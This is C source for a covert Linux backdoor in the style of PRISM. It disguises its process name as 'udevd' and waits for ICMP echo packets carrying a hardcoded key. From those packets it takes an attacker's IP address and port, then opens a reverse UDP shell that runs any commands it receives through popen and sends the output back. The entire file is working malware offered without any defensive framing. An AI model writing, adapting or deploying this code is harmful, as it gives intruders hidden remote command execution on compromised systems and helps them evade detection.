/*
 * reverse_udp.c
 *
 *  Created on: 2017年3月2日
 *      Author: james
 */
#include <stdio.h>
#include <sys/types.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <netdb.h>
#include <unistd.h>
#include <ctype.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <signal.h>
#include <pthread.h>
#define ICMP_PACKET_SIZE 1024
#define ICMP_KEY "p4ssw0rd"
#define VERSION "0.5"
#define MOTD "PRISM v"VERSION" started\n"
#define SHELL "/bin/sh"
#define PROCESS_NAME "udevd"

typedef struct {
	struct sockaddr_in addr;
	int udp_socket;
	int peer_port;

} NET_INFO;

void* thread_cmd_system(void * param);
int icmp_listen(char resver_ip[16], int *port);
int fake_icmp_listen(char resver_ip[16], int *port);

int main(int argc, char **argv) {
	NET_INFO st_netinfo;
	pthread_t thread_id = 0;
	char revers_ip[16];
	strcpy(argv[0], PROCESS_NAME);
	while (icmp_listen(revers_ip, &st_netinfo.peer_port) == 1) {

		if ((st_netinfo.udp_socket = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
			perror("0");
			exit(1);
		}
		st_netinfo.addr.sin_family = AF_INET;

		st_netinfo.addr.sin_port = htons(st_netinfo.peer_port);
		st_netinfo.addr.sin_addr.s_addr = inet_addr(revers_ip);
		printf("Active %s:%d\n", revers_ip, st_netinfo.peer_port);
		// prevent too much active command create too much thread
		if (thread_id)
		{
			printf("Cancel old thread!\n");
			pthread_cancel(thread_id);
		}

		pthread_create(&thread_id, NULL, thread_cmd_system,
				(void*) &st_netinfo);
			sleep(5);
	}
}

void *thread_cmd_system(void * param) {
	const int MAXLINE = 100;
	char result_buf[4096];
	char cmd[512];
	int n, limit;
	socklen_t len;
	FILE *fpRead;
	NET_INFO * nf = (NET_INFO *) param;
	printf("Process Thread startup\n");
	printf("Socket:%d\n", nf->udp_socket);
	n = sendto(nf->udp_socket, MOTD, strlen(MOTD), 0,
			(struct sockaddr *) &nf->addr, sizeof(nf->addr));
	printf("result buffer size :%ld\n", sizeof(result_buf));
	while (1) {
		pthread_testcancel();
		len = sizeof(nf->addr);
		bzero(cmd, sizeof(cmd));
		n = recvfrom(nf->udp_socket, cmd, sizeof(cmd), 0,
				(struct sockaddr*) &(nf->addr), &len);
		if (strstr(cmd, "quit") == cmd) {
			strcpy(result_buf, "SEE YOU NEXT TIME!\n");
			sendto(nf->udp_socket, result_buf, strlen(result_buf), 0,
					(struct sockaddr *) &nf->addr, sizeof(nf->addr));
			close(nf->udp_socket);
			break;
		}

		limit = 0;
		if (n > 0) {
			printf("Receive command %s\n", cmd);
			fpRead = popen(cmd, "r");
			if (fpRead != NULL) {
				bzero(result_buf, sizeof(result_buf));
				while (fgets(result_buf, sizeof(result_buf) - 1, fpRead) != NULL) {
					printf("Send result %s\n", result_buf);
					sendto(nf->udp_socket, result_buf, strlen(result_buf), 0,
							(struct sockaddr *) &nf->addr, sizeof(nf->addr));
					bzero(result_buf, sizeof(result_buf));
					if (++limit > MAXLINE) {
						sprintf(result_buf,"I CAN SHOW YOU NO MORE THAN %d LINES!\n",MAXLINE);
						sendto(nf->udp_socket, result_buf, strlen(result_buf),
								0, (struct sockaddr *) &nf->addr,
								sizeof(nf->addr));
						break;
					}
				}
				pclose(fpRead);
			}
		}
	}
}

int icmp_listen(char resver_ip[16], int *port) {
	int sockfd, n, icmp_key_size;
	char buf[ICMP_PACKET_SIZE + 1];
	struct icmp *icmp;
	struct ip *ip;
	icmp_key_size = strlen(ICMP_KEY);
	sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
	/* get the icmp packet */
	bzero(buf, ICMP_PACKET_SIZE + 1);
	printf("->Waiting for active command\n");
	n = recv(sockfd, buf, ICMP_PACKET_SIZE, 0);
	if (n > 0) {
		ip = (struct ip *) buf;
		icmp = (struct icmp *) (ip + 1);
		/* If this is an ICMP_ECHO packet and if the KEY is correct */
		if ((icmp->icmp_type == ICMP_ECHO)
				&& (memcmp(icmp->icmp_data, ICMP_KEY, icmp_key_size) == 0)) {
			bzero(ip, sizeof(ip));
			sscanf((char *) (icmp->icmp_data + icmp_key_size + 1), "%15s %d",
					resver_ip, port);
			if ((*port <= 0) || (strlen(resver_ip) < 7))
				return 0;
			printf("->From ICMP payload get ip:%s port:%d \n", resver_ip,
					*port);
			return 1;
		}
	}
	return 0;
}

int fake_icmp_listen(char resver_ip[16], int *port) {
	// only for test
	strcpy(resver_ip, "192.168.99.115");
	*port = 5000;
	return 1;
}
